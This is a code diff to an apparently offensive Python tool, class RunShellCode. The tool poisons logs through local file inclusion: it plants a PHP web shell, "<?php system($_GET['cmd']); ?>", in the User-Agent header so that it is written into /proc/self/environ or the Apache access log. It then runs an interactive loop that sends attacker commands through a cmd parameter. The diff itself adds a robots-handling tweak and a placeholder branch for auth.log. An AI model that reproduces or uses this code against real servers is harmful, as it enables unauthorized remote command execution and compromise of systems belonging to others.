@@ -92,7 +92,7 @@ class RunShellCode:
                 if os.path.exists ("./Package/shell/.data")  :
                    os.remove("./Package/shell/.data")  
         elif "proc/self/environ" in self.url \
-        or "/var/log/apache2/access.log" in self.url  :
+        or "/var/log/apache2/access.log" in self.url :
             request = mechanize.Browser()
             paylaodPHP = "<?php system($_GET['cmd']); ?>"  
             request.addheaders = [('User-agent', 'Mozilla/5.0'+paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
@@ -103,6 +103,7 @@ class RunShellCode:
             while True :
                 inputsuer = input(R+"Your_request :  "+W)
                 request = mechanize.Browser()
+                request.set_handle_robots(False)
                 command = self.url+'&cmd='+inputsuer 
                 with open("./Package/shell/.repones2.txt",'w') as repones2:
                     repones2 = repones2.write(str(request.open(command ).read()))     
@@ -140,6 +141,10 @@ class RunShellCode:
                 if os.path.exists ("./Package/shell/.data")  :
                    os.remove("./Package/shell/.data")
                 shutil.copyfile("./Package/shell/.repones2.txt", "./Package/shell/.repones.txt")
+        elif 'auth' in self.url\
+        or 'auth.log' in self.url:
+            print("ssh")
+            time.sleep(10)        
 
 if __name__=='__main__':
     try:
